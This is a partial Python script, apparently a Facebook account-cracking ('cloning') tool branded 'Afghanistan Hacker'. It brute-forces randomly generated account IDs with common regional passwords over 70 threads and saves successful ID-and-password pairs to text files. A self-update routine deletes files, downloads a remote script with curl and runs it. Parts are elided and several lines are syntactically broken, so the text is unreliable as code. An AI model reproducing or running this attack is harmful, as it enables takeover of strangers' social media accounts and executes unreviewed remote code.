...
\33[1;37m----------------------------------------------
→   𝗢𝗪𝗡𝗘𝗥      :  𝗟𝗢𝗩𝗘 ZAHRIO
→   𝗙𝗮𝗰𝗲𝗕𝗼𝗼𝗸  :  𝗠𝗥 ZAHRIO 𝗞𝗛𝗔𝗡
→   𝗚𝗜𝗧𝗛𝗨𝗕      : 𝗛𝗗 𝗞𝗢𝗞𝗢 ZAHRIO
 →  𝗧𝗢𝗢𝗟𝗦        :  𝗔𝗳𝗴𝗵𝗮𝗻𝗶𝘀𝘁𝗮𝗻 𝗛𝗮𝗰𝗸𝗲𝗿 
\x1b[1;97m→ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻  :       0.1
\33[1;37m----------------------------------------------""")
...
cps = []
try:
    print('\n Not worZAHRIO your device\n\033[1;37m Please Wait\033[0;97m\n congratulations worZAHRIO your device ')
    proxy = requests.get('https://raw.githubusercontent.com/ZAHRIO-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ZAHRIO-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf ZAHRIO')
        os.system('curl -L https://raw.githubusercontent.com/ZAHRIO-JUTT/ZAHRIO/main/ZAHRIO.py > ZAHRIO.py')
        os.system('python ZAHRIO.py')
    else:pass
...
def riaz():
	os.system('clear')
	print(logo)
	print('[1] AFGHANISTAN Random CLONING')
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+937266012?text=)
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/kanokwan.plengien'''''')riaz()
	if riaz1 =='2':
		bangla()
	else:
		print('\n\033[1;31mChoose vZAHRIOd option\033[0;97m')
		riaz()
...
def annu():
    ...
    if riaz1 =='4':
        ...
        print('\n\033[1;37m[+] SELECT VZAHRIOD optION\033[0;97m')        
def bangla():
	os.system('clear')
	print(logo)
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','Afghanistan','afghan12345','kabul123','100200','۱٠٠۲٠٠','۵٠٠۶٠٠']
...
def b1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'pakistan','khankhan','khan123','mZAHRIOk123','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'MZAHRIOK123','pakistan','khankhan','khan123','khan12345','123456','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ZAHRIO-OK] '+cid+'|'+ps+'\033[0;97m')
                open('ZAHRIO-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[ZAHRIO-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('ZAHRIO-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mZAHRIO\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
